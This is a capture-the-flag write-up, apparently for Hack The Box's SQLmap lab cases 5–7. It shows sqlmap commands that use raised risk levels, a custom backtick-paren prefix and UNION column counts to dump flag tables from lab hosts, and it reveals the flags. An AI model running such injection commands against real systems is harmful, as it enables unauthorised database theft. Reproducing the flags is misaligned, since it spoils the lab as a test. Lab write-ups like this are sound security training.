## Challenge 1

What's the contents of table flag5? (Case #5)

## Solution 1

On the page, I clicked hte Case5, and there was a link to click with the description to detect and exploit the vulnerability in GET parameter id.

That send me to the following link: `http://83.136.255.180:53163/case5.php?id=1`.

I started the SQLmap with the following command:

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1"
```

and this didn't produce any result, so since it needs `OR`, I will increase the risk level to 2.

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1" --risk=2
```
This again didn't bring any result, so I will now set the risk to 3.

```sh
python3 sqlmap.py "http://83.136.255.180:53163/case5.php?id=1" --risk=3 --dump
```

and I got the flag, which is:

```sh
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{700_much_r15k_bu7_w0r7h_17} |
+----+---------------------------------+
```

## Challenge 2

What's the contents of table flag6? (Case #6)

## Solution 2

Here the description is `Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries` meaning that we have to specify some boundaries to solve the lab.

I tried to increase the level to 4 and the risk to 3, which gave a part of the flag, but it threw errors and stopped.

Then I started to test some prefixes.

I added the ``)` as a prefix, which solved the lab.

```sh
python3 sqlmap.py "http://94.237.55.96:34129/case6.php?col=id" -p col -T flag6 -D testdb --prefix='`)' --dump -t 100
```

This gave the flag which is `HTB{v1nc3_mcm4h0n_15_4570n15h3d}`.

## Challenge 3

What's the contents of table flag7? (Case #7)

## Solution 3

The description is `Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique` which means that there is a possibility that to be succesful we need to count the number of columns, and proivde that.

When I click on the link `click here` on the web page, it showed a table with five columns, so I will try that.

```sh
python3 sqlmap.py "http://94.237.55.96:34129/case7.php?id=1" -union-cols=5 -p id -T flag7 -D testdb --dump -t 100
```

This gave the flag `HTB{un173_7h3_un173d}`.

